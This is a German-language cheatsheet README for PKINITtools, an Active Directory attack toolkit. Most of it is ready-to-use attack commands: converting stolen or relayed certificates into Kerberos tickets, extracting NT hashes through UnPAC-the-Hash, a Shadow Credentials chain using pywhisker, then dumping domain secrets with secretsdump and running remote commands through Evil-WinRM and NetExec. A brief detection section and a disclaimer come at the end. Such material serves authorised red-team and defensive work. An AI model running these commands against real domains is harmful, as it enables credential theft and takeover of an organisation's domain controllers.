<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎫 PKINITtools – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```
<p align="center">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="License MIT">
</p>

<p align="center">
  <b>🌐 Tools für Kerberos Public Key Cryptography for Initial Authentication (PKINIT), Konvertieren von Zertifikaten in TGT-Tickets und Wiederherstellen von NT-Hashes</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Überblick und die PKINIT-Architektur](#-overview--the-pkinit-architecture)
- [Wichtige Dienstprogramme: `gettgtpkinit.py` & `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
- [Installation](#-Installation)
- [Konvertieren von AD CS-Zertifikaten in Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [Verwenden einer PFX-Datei](#using-a-pfx-file)
  - [Verwendung von Base64-encoded PFX (Relay Chains)](#using-base64-encoded-pfx-relay-chains)
- [Wiederherstellen von NT-Hashes (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
- [Shadow Credentials Attack Workflow](#-shadow-credentials-attack-workflow)
- [TGT mit Impacket und NetExec konsumieren](#-consuming-the-tgt-with-impacket--netexec)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und Erkennung](#-defensive-überlegungen--erkennung)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Überblick und die PKINIT-Architektur

**PKINIT** (Public Key Cryptography for Initial Authentication in Kerberos, definiert in **RFC 4556**) ist eine Erweiterung des Kerberos-Protokolls. Anstatt den geheimen Passwort-Hash eines Benutzers (NTLM oder AES) zu erfordern, um ein Kerberos Ticket Granting Ticket (TGT) anzufordern, ermöglicht PKINIT einem Client, die Identität mithilfe von **X.509-Digitalzertifikaten und privaten/öffentlichen Schlüsselpaaren** nachzuweisen.

**PKINITtools** wurde vom renommierten Active Directory-Forscher **Dirk-jan Mollema (@_dirkjan)** entwickelt und stellt die wesentlichen Python-Grundelemente bereit, um:
1. Authentifizieren Sie sich über PKINIT bei Active Directory-Domänencontrollern mithilfe extrahierter oder weitergeleiteter digitaler Zertifikate.
2. Besorgen Sie sich eine Standard-Kerberos-TGT-Datei (`.ccache`).
3. Stellen Sie den Klartext-**NTLM-Hash** des Kontos über den **UnPAC-the-Hash**-Mechanismus wieder her.

---

## 🧰 Wichtige Dienstprogramme: `gettgtpkinit.py` und `getskeyhash.py`

- **`gettgtpkinit.py`**: Kommuniziert mit dem KDC (Kerberos Key Distribution Center) über Port 88, präsentiert das Zertifikat und fordert ein gepanzertes TGT an und speichert es als Kirbi- oder Ccache-Datei.
- **`getskeyhash.py`**: Fragt das im PKINIT-Ticket zurückgegebene Kerberos PAC (Privilege Attribute Certificate) ab, um den statischen NT-Hash des Kontos zu berechnen und verfügbar zu machen.

---

## 📥 Installation
```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```
---

## 🎫 Konvertieren von AD CS-Zertifikaten in Kerberos TGT

Wenn Sie ein Active Directory-Zertifikat über Certipy, Coercer oder NTLM Relay erhalten:

### Verwenden einer PFX-Datei
```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```
### Verwendung von Base64-codiertem PFX (Relay-Ketten)

`ntlmrelayx` druckt Zertifikate bei AD CS ESC8-Angriffen häufig als unformatierte Base64-Zeichenfolge aus:
```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```
---

## 🔑 Wiederherstellen von NT-Hashes (UnPAC-the-Hash)

Wenn sich ein Konto mit PKINIT authentifiziert, signiert der Domänencontroller den PAC mit einer PAC_CREDENTIAL_INFO-Struktur, die den statischen **NTLM-Hash** des Kontos enthält (verschlüsselt mit einem temporären AS-REP-Schlüssel). `getskeyhash.py` entschlüsselt diese Struktur:
```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
Mit dem NT-Hash in der Hand können Sie sofort **Pass-the-Hash** oder Offline-Cracking durchführen!

---

## 👥 Arbeitsablauf für Shadow Credentials-Angriffe

Wenn Sie Schreibzugriff über ein Active Directory-Objekt haben (`GenericAll`, `GenericWrite`, `WriteProperty` über `msDS-KeyCredentialLink`):
```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```
---

## 🚀 Verbrauchen des TGT mit Impacket & NetExec

Sobald `gettgtpkinit.py` ein `.ccache`-Ticket ausgibt, exportieren Sie es in die Umgebung:
```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **TGT über PFX-Datei** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
| **TGT über Base64-Zertifikat** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
| **Domänencontroller angeben**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
| **UnPAC-the-Hash (NTLM abrufen)**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| **TGT an Impacket übergeben** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| **TGT an NetExec übergeben** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ Defensive Überlegungen und Erkennung

1. **Ereignis-ID 4768 (TGT-Anfrage):** Active Directory protokolliert Kerberos TGT-Anfragen. Wenn PKINIT verwendet wird, zeigt das Feld **Vorauthentifizierungstyp** `16` (PKINIT) anstelle von `2` (PA-ENC-TIMESTAMP) an.
2. **Überwachen von `msDS-KeyCredentialLink`-Änderungen:** Ereignis-ID 5136 zeichnet Verzeichnisobjektänderungen auf. Warnung, wenn wichtige Anmeldeinformationen an nicht von Azure/Intune verwaltete Konten angehängt werden.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> PKINITtools ist nur für autorisierte Active Directory-Sicherheitsprüfungen, Red-Team-Operationen und Bildungsforschung gedacht. Die Manipulation von Kerberos-Unternehmenstickets ohne ausdrückliche Genehmigung ist illegal.